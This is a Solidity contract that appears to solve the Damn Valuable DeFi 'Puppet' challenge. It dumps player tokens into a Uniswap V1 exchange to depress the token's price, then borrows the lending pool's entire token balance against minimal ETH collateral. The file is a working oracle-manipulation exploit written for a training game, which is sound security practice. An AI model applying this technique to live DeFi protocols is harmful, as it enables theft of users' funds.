// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract Attack {
    PuppetPool pool;
    address recovery;
    IUniswapV1Exchange exchange;
    DamnValuableToken token;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;



    constructor(address _pool, address _recovery, address _exchange, address _token) {
        pool = PuppetPool(_pool);
        recovery = _recovery;
        exchange = IUniswapV1Exchange(_exchange);
        token = DamnValuableToken(_token);
    }

    function swap() external payable {
        token.approve(address(exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, block.timestamp);
    }

    function drain() external payable {
        pool.borrow{value : msg.value}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    receive() external payable {}
    
}